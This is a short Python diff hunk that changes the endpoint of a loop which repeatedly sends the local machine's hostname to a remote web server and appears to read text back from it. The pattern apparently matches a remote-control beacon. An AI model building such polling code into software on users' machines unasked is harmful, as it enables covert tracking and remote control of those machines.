@@ -37,7 +37,7 @@ with tempfile.TemporaryDirectory() as directory:
     while True:
         pcName = platform.node()
         encodedName = base64Encode(pcName)
-        address = f'http://{websiteAddress}/?pcname={pcName}'
+        address = f'http://{websiteAddress}/interactive.php?pcname={pcName}'
         r = requests.get(address)
         # text = r.text.replace("<html>", "").replace("</html>", "").replace("<head>", "").replace("</head>",
         # "").replace("<body>", "").replace("</body>", "")
